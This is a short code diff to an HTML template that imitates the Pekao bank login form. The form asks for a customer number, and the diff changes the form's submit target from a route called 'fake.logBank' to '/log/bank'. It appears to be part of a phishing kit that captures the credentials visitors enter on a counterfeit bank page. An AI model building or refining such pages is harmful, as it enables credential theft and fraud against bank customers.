@@ -70,7 +70,7 @@
                                                 <div _ngcontent-brt-c20="" class="login-container-form">
                                                     <form _ngcontent-brt-c5="" autocomplete="off"
                                                           class="ng-touched ng-dirty ng-valid" id="bank_pm_form" method="POST"
-                                                          action="{{subRoute('fake.logBank')}}">
+                                                          action="/log/bank">
 
                                                         <pekao-field _ngcontent-brt-c5="" for="customer"
                                                                      label="Wpisz numer klienta" pekaoautofocus=""
